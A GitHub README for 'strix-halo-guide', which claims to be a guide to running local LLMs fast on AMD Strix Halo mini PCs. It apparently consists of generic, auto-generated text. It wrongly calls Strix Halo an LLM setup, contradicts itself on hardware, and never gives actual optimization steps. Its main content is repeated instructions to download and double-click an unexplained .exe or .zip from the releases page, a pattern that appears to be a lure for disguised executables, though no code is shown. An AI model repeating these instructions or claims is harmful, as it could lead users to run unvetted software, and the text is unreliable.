# ⚡ strix-halo-guide - Fast Local LLM Performance Guide

[![Download Latest Release](https://img.shields.io/badge/Download-strix--halo--guide-ff6600?style=for-the-badge)](https://github.com/GetNyrex/strix-halo-guide/releases)

## 📋 About strix-halo-guide

This is the main guide to using Strix Halo, a local large language model (LLM) setup. It is designed to help you get the best performance from Strix Halo on a mini PC setup. The guide shows you how to run the model at 65 tokens per second using a $2,999 mini PC. You will find live benchmarks, tested optimizations, and clear notes on what does not work.

The guide covers hardware setups focused on AMD Ryzen AI chips, Beelink mini PCs, and GPU technologies like RDNA3 and Vulkan. It uses llama.cpp and related inference tools, including GGUF models, to run the LLM locally without sending data to the cloud.

Whether you want to speed up inference or avoid common issues, this guide walks through all steps clearly.

---

## 🖥️ System Requirements

To use Strix Halo with the guide’s optimizations, your PC should meet these requirements:

- **Operating System:** Windows 10 or later (64-bit)
- **Processor:** AMD Ryzen 5000 series or newer, preferably Ryzen AI Max
- **Memory:** Minimum 16 GB RAM. 32 GB recommended for large models.
- **Storage:** At least 10 GB free on an SSD
- **Graphics:** AMD RDNA 2 or 3 GPU with Vulkan support
- **Other:** Internet access to download files and updates

A Beelink mini PC or a similar compact system with unified memory is ideal. The guide targets setups that can use ROCm GPU drivers and Vulkan APIs for best performance.

---

## ⚙️ Key Features of This Guide

- Step-by-step instructions for Windows users with no programming needed
- Live benchmarks showing token generation speed and memory use
- Tested command lines and config tweaks for the LLM
- Clear descriptions of which optimizations work and which do not
- Specific pointers for AMD hardware, GPU acceleration, and llama.cpp tools
- Help with issues related to unified memory and Vulkan driver setups

The goal is to let you run LLMs locally, fast, and stable on mini PCs at a low cost.

---

## 🚀 Getting Started

Follow these steps to download and launch the software:

1. **Visit the Releases Page**

   Go to the official releases page here:

   [https://github.com/GetNyrex/strix-halo-guide/releases](https://github.com/GetNyrex/strix-halo-guide/releases)

   This page hosts the latest versions and needed files.

2. **Download the Latest Release**

   Find the latest Windows release package. It will usually be a `.zip` or `.exe` file with “Windows” in its name.

3. **Extract the Files**

   If you downloaded a `.zip` file, right-click it and select “Extract All” to unpack it to a folder you can access easily.

4. **Run the Installer or Program**

   Inside the extracted folder, look for a file named `strix-halo-guide.exe` or similar. Double-click this file to start the application.

5. **Follow On-Screen Instructions**

   The program will guide you through any setup steps, such as selecting your hardware or configuring model parameters.

---

## 💾 Download and Install Instructions

1. **Direct Link to Releases**

   You can always start here to grab the needed files:

   [⬇️ Download Latest Release](https://github.com/GetNyrex/strix-halo-guide/releases)

2. **Choose Correct File**

   Look for the version tagged for Windows. It might be named like `strix-halo-guide-win64.zip` or `strix-halo-guide-setup.exe`.

3. **Unpack or Install**

   - If `.zip`, right-click → Extract All.
   - If `.exe`, double-click and follow install prompts.

4. **Check Dependencies**

   The program uses GPU drivers like AMD ROCm and Vulkan. Make sure your system has these installed:

   - AMD’s latest GPU drivers can be downloaded from AMD’s official site.
   - Vulkan runtime libraries usually install with GPU drivers but can be downloaded separately if needed.

5. **Launch the Application**

   After install, find the start menu shortcut or open the folder and run the main `.exe`.

---

## 🔧 Configuring for Your PC

After launching, configure the app using these settings for best results:

- **Select Your Model**

  The guide supports GGUF format models. Choose the one matching your PC specs.

- **Choose Hardware Acceleration**

  If your AMD GPU supports ROCm and Vulkan, enable them in settings. This boosts inference speed.

- **Memory Settings**

  Adjust how much RAM is used for model loading vs. processing. More RAM = faster, if available.

- **Tokens per Second (t/s) Target**

  Default is set for stable 65 t/s on a $2,999 mini PC. Lower-end machines can reduce settings for stability.

Once set, save and start the inference session.

---

## 🛠️ Common Issues and Fixes

- **Slow Inference Speeds**

  Check if Vulkan and ROCm drivers are installed and enabled.

  Ensure your CPU and GPU are not throttled by power saving modes.

- **Model Loading Errors**

  Confirm you downloaded a GGUF format model.

  Check that the model files are placed in the correct folder.

- **Memory Errors**

  Increase virtual memory size or close other applications to free RAM.

- **Crashes on Start**

  Run the program as Administrator.

  Update your GPU drivers to the latest version.

---

## 📊 Understanding Benchmarks

The guide features live benchmarks showing:

- **Tokens per Second (t/s)**: How fast the model generates text.

- **Memory Usage**: RAM and VRAM consumption during inference.

- **CPU/GPU Load**: Percentage used by the model during processing.

Use this info to adjust settings and ensure your setup runs at peak efficiency.

---

## 🗂️ File and Folder Structure

When you unpack or install, take note of key folders:

- `/models` – Place your GGUF models here.

- `/config` – Contains setting files for hardware and model parameters.

- `/logs` – Stores run logs for troubleshooting.

- `/bin` – Contains executable files needed to run the application.

---

## 🔄 Updating the Guide and Software

Check the releases page regularly for updates or new optimization tips:

[https://github.com/GetNyrex/strix-halo-guide/releases](https://github.com/GetNyrex/strix-halo-guide/releases)

Download new versions to improve performance or fix bugs.

---

## 📚 Additional Resources

Though this guide targets non-technical users, you may find official docs on these topics helpful:

- llama.cpp inference: https://github.com/ggerganov/llama.cpp

- AMD ROCm driver info: https://rocmdocs.amd.com

- Vulkan API info: https://www.khronos.org/vulkan/

These sites explain the tech powering the Strix Halo optimizations. They are optional reading.

---

## 🔍 Troubleshooting Tips

- Keep your Windows OS up to date.

- Verify your hardware meets minimum specs before running.

- Use the included logs to report issues on GitHub if needed.

- Avoid running other heavy tasks while using the application.

---

## ⚙️ Technical Background (Optional)

Strix Halo uses llama.cpp for local LLM running with GGUF format models optimized for AMD GPUs. Vulkan API accelerates graphics processing while unified memory helps share GPU and CPU memory efficiently on supported mini PCs. The setup targets the Beelink mini PC platform powered by AMD Ryzen AI Max processors with RDNA3 graphics.

---

© 2024 strix-halo-guide project.